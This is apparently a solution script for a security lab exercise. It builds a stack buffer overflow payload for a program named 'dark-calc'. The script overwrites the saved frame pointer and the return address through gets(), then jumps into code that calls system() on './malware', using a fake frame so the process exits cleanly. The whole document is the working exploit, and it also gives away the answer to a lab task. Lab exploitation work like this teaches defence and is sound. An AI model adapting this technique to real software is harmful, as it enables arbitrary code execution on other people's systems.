#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

The vulnerable buffer is input()'s 16-byte `expression` array.
Stack layout (this lab's fixed stack):

    rbp - 0x10 : expression[16]     <- gets() writes here
    rbp        : saved rbp          <- overwritten at offset 16
    rbp + 0x08 : return address     <- overwritten at offset 24

The fixed stack top is 0x721000801000, and input()'s rbp is
0x721000800fe0, so the return-address slot is 0x721000800fe8.

We make command_buf contain "./malware", then return into eval()+0x94
(0x401a6b), the sequence:

    mov edi, 0x6030d0    ; command_buf
    call system@plt

After system() returns, eval's epilogue executes `leave; ret`.  Setting
the saved rbp to 0x721000800ff0 makes that `ret` use main's original
return address (0x401c1f), so the process exits cleanly.
"""

import struct
import sys


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


# "./malware" + NUL, padded to the 16-byte buffer.
command = b"./malware\x00" + b"A" * 6

payload = (
    command
    + p64(0x721000800FF0)  # saved rbp: fake frame for eval()'s leave; ret
    + p64(0x401A6B)        # return address: mov edi, command_buf; call system
)

# gets() appends a NUL at offset 32 (0x721000800ff0), which is harmless:
# it becomes the rbp popped by eval()'s final `leave`, and the following
# `ret` reads main's untouched return address (0x401c1f).

assert len(payload) == 32
assert b"\n" not in payload

sys.stdout.buffer.write(payload)
